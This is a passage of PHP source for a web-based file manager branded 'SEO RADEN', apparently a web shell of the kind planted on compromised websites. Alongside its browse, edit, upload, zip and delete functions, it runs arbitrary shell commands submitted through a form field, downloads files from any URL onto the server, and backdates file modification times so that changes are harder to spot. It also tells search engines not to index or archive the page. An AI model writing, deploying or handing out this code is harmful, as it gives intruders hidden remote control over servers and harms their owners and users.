            $t = safeJoin($current, isset($_POST['target']) ? $_POST['target'] : ''); $_SESSION['msg'] = rrmdir($t) ? 'Delete OK' : 'Delete failed'; return $back();
        }
        case 'mass-delete': {
            $arr = isset($_POST['items']) ? $_POST['items'] : array(); $ok=true;if (is_array($arr)) foreach ($arr as $n) { $ok = rrmdir(safeJoin($current,$n)) && $ok; }
            $_SESSION['msg'] = $ok ? 'Bulk delete OK' : 'Some items failed to delete'; return $back();
        }
        case 'upload': {
            if (!isset($_FILES['files'])) { $_SESSION['msg']='No files provided'; return $back(); }
            $c = count($_FILES['files']['name']); $ok=0; $fail=0; $fails=array();
            for ($i=0;$i<$c;$i++){
                $name=$_FILES['files']['name'][$i]; $tmp=$_FILES['files']['tmp_name'][$i]; $e=$_FILES['files']['error'][$i];
                if ($e!==UPLOAD_ERR_OK){ $fail++; $fails[]="$name (error $e)"; continue; }
                list($done,$why)=tryWriteFromTmp($tmp,safeJoin($current,$name));
                if ($done) $ok++; else { $fail++; $fails[]="$name ($why)"; }
            }
            $_SESSION['msg']="Upload: OK=$ok; Failed=$fail".($fails?'; '.implode(', ',$fails):''); return $back();
        }
        case 'url-upload': {
            $url = trim((string)(isset($_POST['url']) ? $_POST['url'] : ''));
            $fn  = trim((string)(isset($_POST['filename']) ? $_POST['filename'] : ''));
            if ($url===''){ $_SESSION['msg']='URL is empty'; return $back(); }
            if ($fn===''){ $path=parse_url($url,PHP_URL_PATH); $fn=basename($path?$path:''); if($fn===''){ $fn='download.bin'; } }
            list($ok,$w) = fetchUrlToFile($url, safeJoin($current,$fn));
            $_SESSION['msg'] = $ok ? "Downloaded from URL: $fn" : "URL download failed: $w"; return $back();
        }
        case 'mtime': {
            $target = safeJoin($current, isset($_POST['target']) ? $_POST['target'] : '');
            $input = trim((string)(isset($_POST['ts']) ? $_POST['ts'] : '')); $rec = !empty($_POST['recursive']);
            if ($input===''){ $_SESSION['msg']='Change Date: empty'; return $back(); }
            if (ctype_digit($input)) $ts=(int)$input; else { $ts=@strtotime($input); if($ts===false){ $_SESSION['msg']='Change Date: invalid time format'; return $back(); } }
            $ok=true; biru_apply_mtime($target,$ts,$rec,$ok);
            $_SESSION['msg'] = $ok ? ('Change Date OK → '.date('Y-m-d H:i:s',$ts)) : 'Change Date partially failed'; return $back();
        }
        case 'cmd': {
            $cmd = trim((string)(isset($_POST['cmd']) ? $_POST['cmd'] : ''));
            if ($cmd===''){ $_SESSION['msg']='Command is empty.'; return $back(); }
            $result = run_command_all($cmd, $current); $out=(string)$result['out'];
            if (strlen($out)>1024*1024) $out = substr($out,0,1024*1024)."\n[output truncated]";
            $_SESSION['cmd_result']=array('cmd'=>$cmd,'method'=>$result['method'],'code'=>$result['code'],'out'=>$out); return $back();
        }

        /* ===== MOVE, ZIP, UNZIP ===== */
        case 'move': {
            $srcName = (string)(isset($_POST['src']) ? $_POST['src'] : '');
            $dstDir  = (string)(isset($_POST['dst']) ? $_POST['dst'] : '');
            $srcFull = safeJoin($current, $srcName);
            if ($srcName==='' || !file_exists($srcFull)) { $_SESSION['msg']='Move failed: source missing'; return $back(); }
            if ($dstDir==='') { $_SESSION['msg']='Move failed: destination empty'; return $back(); }
            if (!is_dir($dstDir)) { $_SESSION['msg']='Move failed: destination is not a directory'; return $back(); }
            $dstFull = safeJoin($dstDir, basename($srcName));
            if (@realpath($srcFull)===@realpath($dstFull)) { $_SESSION['msg']='Move skipped (same location)'; return $back(); }
            $ok = @rename($srcFull, $dstFull);
            $_SESSION['msg'] = $ok ? 'Move OK' : 'Move failed';
            return $back();
        }
        case 'zip': {
            $items = isset($_POST['items']) ? $_POST['items'] : array();
            $name  = trim((string)(isset($_POST['zipname']) ? $_POST['zipname'] : ''));
            if (!is_array($items) || empty($items)) { $_SESSION['msg']='Zip failed: nothing selected'; return $back(); }
            if ($name==='') $name = 'archive-'.date('Ymd-His').'.zip';
            $archivePath = safeJoin($current, $name);

            $done=false; $err='';
            if (class_exists('ZipArchive')) {
                $zip = new ZipArchive();
                if ($zip->open($archivePath, ZipArchive::CREATE|ZipArchive::OVERWRITE)===true) {
                    foreach ($items as $it) {
                        $full = safeJoin($current, $it);
                        if (is_dir($full)) {
                            $itClean = rtrim($it, DIRECTORY_SEPARATOR);
                            addDirToZip($zip, $full, $itClean);
                        } elseif (is_file($full)) {
                            $zip->addFile($full, basename($it));
                        }
                    }
                    $zip->close(); $done=true;
                } else { $err='ZipArchive open failed'; }
            }
            if (!$done) {
                if (class_exists('PharData')) {
                    try {
                        $tarName = preg_replace('~\.zip$~i', '.tar', $archivePath);
                        $phar = new PharData($tarName);
                        foreach ($items as $it) {
                            $full = safeJoin($current, $it);
                            if (is_dir($full)) {
                                $phar->addEmptyDir(basename($it));
                                addDirToPhar($phar, $full, basename($it));
                            } elseif (is_file($full)) {
                                $phar->addFile($full, basename($it));
                            }
                        }
                        unset($phar);
                        $_SESSION['msg']='ZipArchive not available; created TAR instead: '.basename($tarName);
                        return $back();
                    } catch (Exception $e) { $err = 'TAR fallback failed: '.$e->getMessage(); }
                } else {
                    $err = ($err ? $err.'; ' : '').'No ZipArchive nor PharData available';
                }
            }
            $_SESSION['msg'] = $done ? ('Archive created: '.basename($archivePath)) : ('Zip failed: '.$err);
            return $back();
        }
        case 'unzip': {
            $file = safeJoin($current, isset($_POST['file']) ? $_POST['file'] : '');
            if (!is_file($file)) { $_SESSION['msg']='Unzip failed: file not found'; return $back(); }
            $ext = strtolower(pathinfo($file, PATHINFO_EXTENSION));
            $ok=false; $err='';
            if ($ext==='zip' && class_exists('ZipArchive')) {
                $zip = new ZipArchive();
                if ($zip->open($file)===true) { $ok = $zip->extractTo($current); $zip->close(); if(!$ok) $err='Zip extractTo failed'; }
                else { $err='Zip open failed'; }
            } else {
                try {
                    if (class_exists('PharData') && preg_match('~\.(tar|tar\.gz|tar\.bz2|tar\.xz)$~i', $file)) {
                        $phar = new PharData($file);
                        $phar->extractTo($current, null, true);
                        $ok=true;
                    } else {
                        $err='Unsupported archive type or PharData not available';
                    }
                } catch (Exception $e) { $err=$e->getMessage(); }
            }
            $_SESSION['msg'] = $ok ? 'Unzip OK' : ('Unzip failed: '.$err);
            return $back();
        }
    }
}

/* ==== Helpers for ZIP/TAR recursion ==== */
/* Hapus type-hint ZipArchive agar tidak fatal di PHP tanpa ekstensi zip */
function addDirToZip($zip, $dir, $local){
    $dir = rtrim($dir, DIRECTORY_SEPARATOR);
    if (method_exists($zip, 'addEmptyDir')) $zip->addEmptyDir($local);
    $h = @opendir($dir); if(!$h) return;
    while(false!==($e=readdir($h))){
        if($e==='.'||$e==='..') continue;
        $full = $dir.DIRECTORY_SEPARATOR.$e;
        $localPath = $local.'/'.basename($e);
        if (is_dir($full)) addDirToZip($zip, $full, $localPath);
        elseif (is_file($full) && method_exists($zip,'addFile')) $zip->addFile($full, $localPath);
    }
    closedir($h);
}
function addDirToPhar($phar, $dir, $local){
    $dir = rtrim($dir, DIRECTORY_SEPARATOR);
    $h = @opendir($dir); if(!$h) return;
    while(false!==($e=readdir($h))){
        if($e==='.'||$e==='..') continue;
        $full = $dir.DIRECTORY_SEPARATOR.$e;
        $localPath = $local.'/'.basename($e);
        if (is_dir($full)) { if (method_exists($phar,'addEmptyDir')) $phar->addEmptyDir($localPath); addDirToPhar($phar,$full,$localPath); }
        elseif (is_file($full) && method_exists($phar,'addFile')) { $phar->addFile($full, $localPath); }
    }
    closedir($h);
}

/* =========================
 *   VIEW MODEL & RENDER
 * ========================= */
$items = listDirEntries($current);
$files=array(); $dirs=array();
foreach($items as $it){ $full=$current.DIRECTORY_SEPARATOR.$it; if(is_dir($full)) $dirs[]=$it; else $files[]=$it; }
$hasNatural=defined('SORT_NATURAL'); $hasFlagCase=defined('SORT_FLAG_CASE');
if ($hasNatural){ sort($dirs, $hasFlagCase?(SORT_NATURAL|SORT_FLAG_CASE):SORT_NATURAL); sort($files, $hasFlagCase?(SORT_NATURAL|SORT_FLAG_CASE):SORT_NATURAL); }
else { natcasesort($dirs); $dirs=array_values($dirs); natcasesort($files); $files=array_values($files); }

$up = dirname($current); if ($up===$current) $up=$current;

$isEdit = ((((isset($_GET['a']) ? $_GET['a'] : '') === 'edit')) && isset($_GET['f'])) ? safeJoin($current, $_GET['f']) : null;
$editFile = ($isEdit && is_file($isEdit)) ? $isEdit : null;

$isView = ((((isset($_GET['a']) ? $_GET['a'] : '') === 'view')) && isset($_GET['f'])) ? safeJoin($current, $_GET['f']) : null;
$viewFile = ($isView && is_file($isView)) ? $isView : null;

$modeParam = isset($_GET['mode']) ? $_GET['mode'] : 'auto';
$viewMode = in_array($modeParam, array('txt','b64','auto'), true) ? $modeParam : 'auto';

$csrf = isset($_SESSION['csrf']) ? $_SESSION['csrf'] : '';
$yearNow = date('Y');
?>
<!doctype html>
<html lang="en" class="dark">
<head>
  <meta charset="utf-8">
  <title>SEO RADEN FILE MANAGER</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="robots" content="noindex,nofollow,noarchive,nosnippet,noimageindex">
  <meta name="googlebot" content="noindex,nofollow,noarchive,nosnippet,noimageindex">
  <script src="https://cdn.tailwindcss.com"></script>
  <script>
    tailwind.config = { darkMode:'class', theme:{ extend:{
      fontFamily:{ ui:['Ubuntu','ui-sans-serif','system-ui','Segoe UI','Roboto','Helvetica Neue','Arial','Noto Sans'] },
      colors:{ canvas:{DEFAULT:'#0b1220',light:'#0b1220',surface:'rgba(15,23,42,.8)'}, brand:{50:'#eef2ff',500:'#6366f1',600:'#5458ee',700:'#4338ca'} },
      boxShadow:{ card:'0 10px 30px rgba(0,0,0,.35), inset 0 1px 0 rgba(255,255,255,.03)' , glow:'0 6px 20px rgba(99,102,241,.25)' },
      borderRadius:{ xl2:'18px' }
    } } }
  </script>
  <link href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@300;400;500;700&display=swap" rel="stylesheet">
  <link href="https://www.svgrepo.com/show/475654/github-color.svg" rel="icon">

  <!-- CodeMirror 5 -->
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/codemirror.min.css">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/theme/material-darker.min.css">
  <style>
    .CodeMirror{ border:1px solid rgba(148,163,184,.18); border-radius:12px; height:420px; background:#0b1220; color:#e5e7eb; }
    .cm-s-material-darker .CodeMirror-gutters{ background:#0b1220; border-right:1px solid rgba(148,163,184,.18); }

    html,body{height:100%}
    body{font-family:'Ubuntu',system-ui,-apple-system,Segoe UI,Roboto,"Helvetica Neue",Arial,"Noto Sans";}
    .shell{min-height:100vh;background:radial-gradient(1200px 600px at 20% -10%, rgba(99,102,241,.15), transparent 60%), radial-gradient(900px 500px at 90% 0%, rgba(168,85,247,.12), transparent 60%), #0b1220; display:grid; grid-template-rows:auto 1fr auto;}
    .card{background:rgba(15,23,42,.8);border:1px solid rgba(148,163,184,.15);border-radius:18px;box-shadow:0 10px 30px rgba(0,0,0,.35), inset 0 1px 0 rgba(255,255,255,.03);backdrop-filter:blur(8px);}
    .field{border:1px solid rgba(148,163,184,.18);border-radius:12px;padding:.5rem .75rem;width:100%;background:#0b1220;color:#e5e7eb;}
    .field:focus{outline:none;box-shadow:0 0 0 4px rgba(99,102,241,.25);border-color:#6366f1}
    .btn{background:linear-gradient(180deg,#6366f1,#4f46e5);color:#eef2ff;border-radius:10px;padding:.5rem .75rem;font-weight:700;font-size:.875rem;line-height:1.25rem;display:inline-flex;align-items:center;justify-content:center;transition:transform .05s, box-shadow .15s, filter .15s; box-shadow:0 6px 20px rgba(99,102,241,.22);}
    .btn:hover{filter:brightness(1.06);box-shadow:0 10px 26px rgba(99,102,241,.35)} .btn:active{transform:translateY(.5px)}
    .btn-ghost{background:transparent;border:1px solid rgba(148,163,184,.25);color:#e5e7eb;}
    .btn-xs{padding:.25rem .5rem;font-size:.75rem;border-radius:8px}.btn-sm{padding:.35rem .6rem;font-size:.8125rem;border-radius:9px}.btnw{min-width:96px}
    .tbl thead th{position:sticky;top:0;background:#0b1220e6;backdrop-filter:blur(6px);z-index:1;color:#cbd5e1}
    .tbl tbody tr:nth-child(even){background:rgba(148,163,184,.04)}
    .tbl tbody tr.hoverable:hover{background:rgba(99,102,241,.22);box-shadow:inset 0 0 0 9999px rgba(99,102,241,.10)}
    .tbl tbody tr.hoverable{transition:background .15s ease}
    .ico{width:18px;height:18px;display:inline-block;vertical-align:text-bottom;color:#cbd5e1}
    .mono{font-family:ui-monospace,SFMono-Regular,Menlo,Monaco,Consolas,"Liberation Mono","Courier New",monospace}
    .badge-small{font-size:11px;padding:.1rem .4rem;border-radius:999px;background:#111827;color:#c7d2fe;border:1px solid #374151}
    .row-actions{display:grid;grid-template-columns:repeat(8, minmax(90px, auto));gap:.35rem;justify-items:start}
    @media (max-width:1200px){ .row-actions{grid-template-columns:repeat(3, minmax(90px, auto));} }
    .tablewrap{height:calc(100vh - 320px);overflow:auto}
    @media (max-height:800px){ .tablewrap{height:calc(100vh - 360px)} }
    .drop-hint{border:2px dashed rgba(99,102,241,.45); background:rgba(99,102,241,.06)}
    .droptarget{outline:2px dashed rgba(99,102,241,.7); outline-offset:-2px}
    /*#tableCard{ min-height: calc(100vh - 260px); }*/

    /* Command editors */
    .cm-cmd-input { font-size:13px; line-height:1.45; }
    .cm-cmd-input .CodeMirror { width:100% !important; }
    .cm-cmd-input .CodeMirror-scroll { height:36px !important; } /* single line */
    .cm-cmd-input .CodeMirror { height:36px !important; }
    .cm-cmd-output { font-size:14px; line-height:1.5; }
    .cm-cmd-output .CodeMirror { width:100% !important; }
    .cm-cmd-output .CodeMirror-scroll { height:380px !important; }

    /* Lebar command dibatasi agar tidak terlalu panjang */
    .cmd-container{ max-width:600px; width:100%; }
    @media (min-width:1536px){ .cmd-container{ max-width:680px; } }

    /* Make table copy-friendly */
    #tableCard, #tableCard * { user-select: text; -webkit-user-select: text; }

    /* Force ALL links inside the directory table to be white */
    #dirTable a, #dirTable a:visited { color:#ffffff !important; }

    /* Footer gradient line */
    .footer-line{height:1px;background:linear-gradient(90deg,rgba(99,102,241,.0),rgba(99,102,241,.5),rgba(99,102,241,.0));}

    /* Placeholder abu untuk CodeMirror command */
    .cm-cmd-input .CodeMirror-empty .CodeMirror-placeholder {
      color:#94a3b8; /* slate-400 */
      opacity:.95;
    }
  </style>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/codemirror.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/addon/mode/loadmode.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/mode/meta.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/addon/edit/closebrackets.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/addon/edit/matchbrackets.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/addon/selection/active-line.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/addon/display/placeholder.min.js"></script>
</head>
<body class="shell text-slate-100" id="bodyRoot">
  <header class="sticky top-0 z-20 w-full border-b border-slate-800 bg-slate-900/70 backdrop-blur">
    <div class="w-full px-6 py-3 flex items-center justify-between gap-3">
      <div class="flex items-center gap-3 shrink-0">
        <div class="text-2xl"><?php echo svgIcon('pwx', 'ico'); ?></div>
        <div>
          <div class="text-lg font-semibold tracking-tight" style="background:linear-gradient(90deg,#93c5fd,#c4b5fd);-webkit-background-clip:text;background-clip:text;color:transparent"><a href="?">SEO RADEN</a></div>
          <div class="text-xs text-slate-400">PHP <?php echo h(PHP_VERSION); ?></div>
        </div>
      </div>

      <div class="hidden md:flex items-center gap-2 rounded-xl border border-slate-700 bg-slate-900/60 px-2 py-1 shrink-0">
        <?php echo svgIcon('search','ico'); ?>
        <input id="searchBox" type="search" placeholder="Filter by name (Ctrl+/)" class="bg-transparent text-sm outline-none placeholder:text-slate-500 w-64" oninput="filterRows()">
      </div>

      <div class="text-sm text-slate-300 hidden lg:block truncate">
        Path: <span class="mono"><?php echo h($current); ?></span>
      </div>

      <!-- Command (dibatasi lebar) -->
      <div class="cmd-container ml-auto">
        <form method="post" action="?a=cmd&p=<?php echo rawurlencode($current); ?>" class="hidden md:flex items-center gap-2 w-full" id="cmdForm">
          <input type="hidden" name="csrf" value="<?php echo h($csrf); ?>">
          <textarea id="cmdTA" name="cmd" class="field mono w-full" placeholder="Run Command" rows="1"></textarea>
          <button class="btn btn-sm shrink-0" type="submit">Run</button>
        </form>
      </div>

      <form method="post" action="?a=logout&p=<?php echo rawurlencode($current); ?>" class="ml-1 shrink-0">
        <input type="hidden" name="csrf" value="<?php echo h($csrf); ?>">
        <button class="btn btn-sm" type="submit">Logout</button>
      </form>
    </div>
  </header>

  <main class="w-full px-6 py-4 grid grid-cols-12 gap-4">

    <?php if (!empty($_SESSION['cmd_result'])): $cr = $_SESSION['cmd_result']; unset($_SESSION['cmd_result']); ?>
      <section class="col-span-12">
        <div class="card p-4 mb-4">
          <details open>
            <summary class="cursor-pointer font-medium">
              Command Output × <span class="mono"><?php echo h($cr['cmd']); ?></span>
              <span class="ml-2 text-xs text-slate-400">via <?php echo h($cr['method']); ?>, exit <?php echo h((string)$cr['code']); ?></span>
            </summary>
            <pre id="cmdOutPre" class="mt-3 p-3 bg-black/40 rounded-lg overflow-auto text-xs mono border border-slate-700" style="max-height: 480px;"><?php echo h($cr['out']); ?></pre>
          </details>
        </div>
      </section>
    <?php endif; ?>

    <!-- SIDEBAR -->
    <aside class="col-span-12 xl:col-span-3 space-y-4">
      <?php if (!empty($_SESSION['msg'])): ?>
        <div class="rounded-xl border border-blue-900/60 bg-blue-900/20 text-blue-100 px-4 py-3">
          <?php echo h($_SESSION['msg']); unset($_SESSION['msg']); ?>
        </div>
      <?php endif; ?>

      <section class="card p-4">
        <h2 class="font-medium mb-3">Navigation</h2>
        <div class="mb-2 text-sm text-slate-300">Breadcrumbs</div>
        <div class="flex flex-wrap gap-1 text-sm">
          <?php foreach (breadcrumbs($current) as $i => $crumb): list($name, $path) = $crumb; ?>
            <?php if ($i) echo '<span class="text-slate-600">/</span>'; ?>
            <a href="?p=<?php echo rawurlencode($path); ?>" class="inline-flex items-center gap-1 px-2 py-1 rounded-md border border-slate-700 bg-slate-800 text-slate-200 hover:border-slate-500 hover:bg-slate-700 transition"><?php echo h($name); ?></a>
          <?php endforeach; ?>
        </div>
        <hr class="my-4 border-slate-700">
        <form method="get" class="space-y-2">
          <label class="text-sm text-slate-300">Change Path</label>
          <input type="text" name="p" class="field mono" placeholder="/home/user" value="<?php echo h($current); ?>">
          <div class="flex gap-2">
            <button class="btn btnw" type="submit">Go</button>
            <a class="btn btnw" href="?">Go to CWD</a>
          </div>
        </form>
      </section>

      <!-- CREATE: New File / New Folder -->
      <section class="card p-4">
        <h2 class="font-medium mb-3">Create</h2>

        <form method="post" action="?a=new-file&p=<?php echo rawurlencode($current); ?>" class="space-y-2">
          <input type="hidden" name="csrf" value="<?php echo h($csrf); ?>">
          <label class="text-sm text-slate-300">New File</label>
          <input type="text" name="name" class="field mono" placeholder="newfile.txt" required>
          <textarea name="content" class="field mono" rows="2" placeholder="(Optional) initial content; jika kosong akan diisi timestamp otomatis"></textarea>
          <button class="btn w-full" type="submit">Create File</button>
          <div class="text-xs text-slate-400">Dibuat non-0 byte dengan beberapa fallback (lintas versi PHP).</div>
        </form>

        <hr class="my-3 border-slate-700">

        <form method="post" action="?a=new-dir&p=<?php echo rawurlencode($current); ?>" class="space-y-2">
          <input type="hidden" name="csrf" value="<?php echo h($csrf); ?>">
          <label class="text-sm text-slate-300">New Folder</label>
          <input type="text" name="name" class="field mono" placeholder="NewFolder" required>
          <button class="btn w-full" type="submit">Create Folder</button>
        </form>
      </section>

      <section class="card p-4">
        <h2 class="font-medium mb-3">Upload</h2>
        <div class="grid grid-cols-1 gap-4">
          <form method="post" enctype="multipart/form-data" action="?a=upload&p=<?php echo rawurlencode($current); ?>" class="space-y-2">
            <input type="hidden" name="csrf" value="<?php echo h($csrf); ?>">
            <input type="file" name="files[]" multiple class="block text-sm file:mr-3 file:rounded-md file:border file:border-slate-700 file:px-3 file:py-1.5 file:bg-slate-800 file:text-slate-200">
            <button class="btn w-full" type="submit">Upload Files</button>
            <div class="text-xs text-slate-400">Fallback order: move × rename × copy × get+put × stream copy.</div>
          </form>
          <form method="post" action="?a=url-upload&p=<?php echo rawurlencode($current); ?>" class="space-y-2">
            <input type="hidden" name="csrf" value="<?php echo h($csrf); ?>">
            <input type="url" name="url" class="field" placeholder="https://example.com/file.txt" required>
            <input type="text" name="filename" class="field" placeholder="File name (optional)">
            <button class="btn w-full" type="submit">Fetch from URL</button>
            <div class="text-xs text-slate-400">Methods: cURL × copy(stream) × get+put × stream copy.</div>
          </form>
          <div class="text-xs text-slate-400">
            Tip: You can also drag &amp; drop files anywhere on this page to upload.
          </div>
        </div>
      </section>
    </aside>

    <!-- MAIN: Editor / Preview panels + Table -->
    <section class="col-span-12 xl:col-span-9 flex flex-col gap-4">

      <?php if ($editFile): ?>
        <?php
          $autoMode = ($viewMode === 'auto');
          if ($autoMode) { $viewMode = isTextFile($editFile) ? 'txt' : 'b64'; }
          $rawContent = @file_get_contents($editFile); if ($rawContent === false) { $rawContent = ''; }
          $display = ($viewMode === 'b64') ? base64_encode($rawContent) : $rawContent;?>
        <div class="card p-4" id="editPanelWrap">
          <details id="editPanel" open>
            <summary class="cursor-pointer font-medium flex items-center justify-between">
              <div class="flex items-center gap-2">
                <span>Edit File</span>
                <span class="text-xs text-slate-400">Size: <?php echo h(humanSize((int)@filesize($editFile))); ?></span>
              </div>
              <div class="flex items-center gap-2">
                <button type="button" class="btn btn-xs btn-ghost" onclick="document.getElementById('editPanel').open=false">Close</button>
              </div>
            </summary>

            <div class="mt-3 text-xs text-slate-400 mono line-clamp-2"><?php echo h($editFile); ?></div>

            <div class="mt-2">
              <a class="inline-block px-2 py-1 rounded-md border border-slate-700 text-xs <?php echo $viewMode==='txt'?'bg-indigo-600 text-white border-indigo-600':'bg-slate-800'; ?>" href="?a=edit&f=<?php echo rawurlencode(basename($editFile)); ?>&p=<?php echo rawurlencode($current); ?>&mode=txt">Text</a>
              <a class="inline-block px-2 py-1 rounded-md border border-slate-700 text-xs <?php echo $viewMode==='b64'?'bg-indigo-600 text-white border-indigo-600':'bg-slate-800'; ?>" href="?a=edit&f=<?php echo rawurlencode(basename($editFile)); ?>&p=<?php echo rawurlencode($current); ?>&mode=b64">Base64</a>
            </div>

            <form method="post" action="?a=edit-save&p=<?php echo rawurlencode($current); ?>" class="mt-3" id="editForm">
              <input type="hidden" name="csrf" value="<?php echo h($csrf); ?>">
              <input type="hidden" name="file" value="<?php echo h(basename($editFile)); ?>">
              <input type="hidden" name="mode" value="<?php echo h($viewMode); ?>">

              <?php if ($viewMode === 'txt'): ?>
                <textarea id="editor" name="content"><?php echo h($display); ?></textarea>
              <?php else: ?>
                <textarea name="content" class="w-full h-72 border border-slate-700 rounded-xl p-3 mono bg-slate-900 text-slate-100" spellcheck="false"><?php echo h($display); ?></textarea>
                <div class="mt-2 text-xs text-slate-400">Base64 mode: content will be decoded on save.</div>
              <?php endif; ?>

              <div class="mt-3 flex flex-wrap gap-2 items-center">
                <button class="btn btnw" type="submit">Save</button>
                <button class="btn btnw btn-ghost" type="button" onclick="document.getElementById('editPanel').open=false">Close</button>
                <a class="btn btnw" href="?p=<?php echo rawurlencode($current); ?>">Exit & Reset</a>
                <?php if ($viewMode === 'txt'): ?>
                  <span class="text-xs text-slate-400">Text mode: syntax highlighting auto-detects file type.</span>
                <?php endif; ?>
              </div>
            </form>
          </details>
        </div>
      <?php endif; ?>

      <?php if ($viewFile): ?>
        <?php
          $vf_size = (int)@filesize($viewFile);
          $vf_ext  = strtolower(pathinfo($viewFile, PATHINFO_EXTENSION));
          $is_img  = in_array($vf_ext, array('jpg','jpeg','png','gif','webp','bmp','svg'));
          $is_txt  = isTextFile($viewFile);
          $preview_max = 512 * 1024; // 512KB
          $txt = '';
          if ($is_txt) {
              $txt = @file_get_contents($viewFile, false, null, 0, $preview_max);
              if ($txt === false) $txt = '';
          }
        ?>
        <div class="card p-4" id="previewWrap">
          <details id="previewPanel" open>
            <summary class="cursor-pointer font-medium flex items-center justify-between">
              <div class="flex items-center gap-2">
                <span>Preview: <span class="mono"><?php echo h(basename($viewFile)); ?></span></span>
                <span class="text-xs text-slate-400">Size: <?php echo h(humanSize($vf_size)); ?></span>
              </div>
              <div class="flex items-center gap-2">
                <button type="button" class="btn btn-xs btn-ghost" onclick="document.getElementById('previewPanel').open=false">Close</button>
              </div>
            </summary>

            <div class="mt-3 text-xs text-slate-400 mono"><?php echo h($viewFile); ?></div>

            <div class="mt-3">
              <?php if ($is_img): ?>
                <img src="?a=raw&f=<?php echo rawurlencode(basename($viewFile)); ?>&p=<?php echo rawurlencode($current); ?>" alt="preview image" class="max-w-full rounded-lg border border-slate-700" style="max-height:480px;object-fit:contain;">
              <?php elseif ($is_txt): ?>
                <pre id="previewPre" class="p-3 bg-black/40 rounded-lg overflow-auto text-sm mono border border-slate-700" style="max-height:480px;"><?php echo h($txt); ?></pre>
                <?php if ($vf_size > $preview_max): ?>
                  <div class="mt-2 text-xs text-slate-400">Showing <?php echo h(humanSize($preview_max)); ?> of <?php echo h(humanSize($vf_size)); ?>. Use Edit/Download for full content.</div>
                <?php endif; ?>
              <?php else: ?>
                <div class="rounded-lg border border-slate-700 p-3 bg-slate-900/50">
                  <div class="text-sm">This file type cannot be previewed directly.</div>
                  <div class="mt-2 flex gap-2">
                    <a class="btn btn-sm btnw" href="?a=download&f=<?php echo rawurlencode(basename($viewFile)); ?>&p=<?php echo rawurlencode($current); ?>">Download</a>
                    <a class="btn btn-sm btnw" href="?a=edit&f=<?php echo rawurlencode(basename($viewFile)); ?>&p=<?php echo rawurlencode($current); ?>">Edit (careful if binary)</a>
                  </div>
                </div>
              <?php endif; ?>
            </div>
          </details>
        </div>
      <?php endif; ?>

      <div class="card p-4 flex flex-col" id="tableCard">
        <div class="flex items-center justify-between mb-3">
          <h2 class="font-medium">Directory Contents</h2>
          <div class="text-sm text-slate-400">Dirs: <?php echo count($dirs); ?> × Files: <?php echo count($files); ?></div>
        </div>
        <form method="post" action="?a=mass-delete&p=<?php echo rawurlencode($current); ?>" class="flex-1 flex flex-col" id="bulkDeleteForm">
          <input type="hidden" name="csrf" value="<?php echo h($csrf); ?>">
          <div class="mb-3 flex flex-wrap gap-2">
            <button class="btn btn-sm btnw" type="submit" onclick="return confirm('Delete all selected items?')">Delete Selected</button>
            <button class="btn btn-sm btnw btn-ghost" type="button" onclick="selectAll(true)">Select All</button>
            <button class="btn btn-sm btnw btn-ghost" type="button" onclick="selectAll(false)">Select None</button>

            <div class="hidden md:flex items-center gap-2 ml-auto text-xs text-slate-400">
              <span>Sort:</span>
              <button type="button" class="btn btn-xs btn-ghost" onclick="sortBy('name')">Name</button>
              <button type="button" class="btn btn-xs btn-ghost" onclick="sortBy('size')">Size</button>
              <button type="button" class="btn btn-xs btn-ghost" onclick="sortBy('mtime')">Modified</button>
            </div>

            <!-- Toggle drag-to-move (default OFF) -->
            <label class="flex items-center gap-2 text-xs text-slate-300 ml-2">
              <input id="dragToggle" type="checkbox" class="accent-indigo-500">
              Enable drag-to-move
            </label>
          </div>

          <div class="tablewrap overflow-x-auto rounded-xl border border-slate-700 flex-1" id="dropZone">
            <table id="dirTable" class="tbl min-w-full text-sm">
              <thead class="text-left border-b border-slate-700">
                <tr>
                  <th class="py-2 px-2 w-10"><input type="checkbox" id="chkAll" onclick="toggleAll(this)"></th>
                  <th class="py-2 px-2">Name</th>
                  <th class="py-2 px-2">Size</th>
                  <th class="py-2 px-2">Perms</th>
                  <th class="py-2 px-2">Modified</th>
                  <th class="py-2 px-2">Actions</th>
                </tr>
              </thead>
              <tbody id="dirBody">
                <?php foreach ($dirs as $name): $full = $current . DIRECTORY_SEPARATOR . $name;
                      $r = @is_readable($full); $w = @is_writable($full);
                      $permColorClass = $w ? 'text-lime-400' : ($r ? 'text-white' : 'text-red-400');
                ?>
                  <tr class="border-b border-slate-800 hoverable"
                      data-type="dir"
                      data-name="<?php echo h(strtolower($name)); ?>"
                      data-size="0"
                      data-mtime="<?php echo (int)@filemtime($full); ?>"
                      draggable="true"
                      ondragstart="onDragStartItem(event, <?php echo je($name); ?>)"
                      ondragover="onDragOverDir(event)"
                      ondragleave="onDragLeaveDir(event)"
                      ondrop="onDropToDir(event, <?php echo je($name); ?>)">
                    <td class="py-2 px-2"><input class="rowchk" type="checkbox" name="items[]" value="<?php echo h($name); ?>"></td>
                    <td class="py-2 px-2">
                      <div class="flex items-center gap-2 <?php echo $permColorClass; ?>">
                        <?php echo iconSvgFor($full); ?>
                        <a class="hover:underline font-medium text-white"
                           draggable="false"
                           onclick="return guardLinkCopy(event)"
                           href="?p=<?php echo rawurlencode($full); ?>"><?php echo h($name); ?></a>
                        <span class="badge-small">DIR</span>
                      </div>
                    </td>
                    <td class="py-2 px-2">-</td>
                    <td class="py-2 px-2 mono <?php echo $permColorClass; ?>"><?php echo h(permsToString($full)); ?></td>
                    <td class="py-2 px-2"><?php echo h(date('Y-m-d H:i:s', @filemtime($full) ?: time())); ?></td>
                    <td class="py-2 px-2">
                      <div class="row-actions">
                        <span class="btn btn-xs btnw" style="opacity:.35; pointer-events:none;">Edit</span>
                        <span class="btn btn-xs btnw" style="opacity:.35; pointer-events:none;">Download</span>

